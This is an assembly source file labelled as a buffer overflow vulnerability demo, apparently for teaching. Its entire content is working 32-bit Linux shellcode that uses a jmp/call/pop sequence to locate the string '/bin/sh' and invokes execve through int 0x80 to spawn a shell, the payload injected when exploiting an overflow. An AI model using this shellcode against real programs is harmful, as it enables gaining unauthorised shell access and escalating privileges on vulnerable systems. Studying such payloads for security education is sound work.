// BOFDemo: a simple buffer overflow vulnerability demo

        .text
        .globl  shellcode

shellcode:
        xorl    %eax, %eax
        xorl    %edx, %edx
        jmp     lblb
lbla:   
        popl    %ebx
        movb    %al, 7(%ebx)
        movl    %ebx, 8(%ebx)
        movl    %eax, 12(%ebx)
        leal    8(%ebx), %ecx
        movb    $11, %al
        int     $0x80
lblb:
        call    lbla
        .string "/bin/sh"
        
        
